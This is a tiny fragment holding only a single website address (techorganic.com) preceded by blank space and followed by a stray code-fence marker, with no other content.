                                              http://www.techorganic.com 

```